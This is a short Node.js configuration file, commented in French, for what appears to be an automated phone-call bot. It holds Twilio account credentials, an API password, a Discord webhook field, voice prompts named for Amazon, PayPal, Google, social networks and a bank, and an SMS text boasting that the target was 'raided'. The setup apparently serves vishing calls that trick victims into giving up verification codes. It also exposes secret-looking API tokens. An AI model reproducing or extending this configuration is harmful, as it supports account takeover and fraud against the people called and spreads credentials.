module.exports = {
    setupdone: 'false',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: 'AC1ff87542ecf3c13b1fa78580f7360951',
    authToken: '7e0564c899f0c0647c9546ad347ab881',
    callerid: '+17634017282',

    /**
     * Informations à propos de l'API
     */
    apipassword: 'caller1337',
    serverurl: 'http://yourserverip:80',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: '',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 80,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'Your Sms Raided By ZxxLK'
};
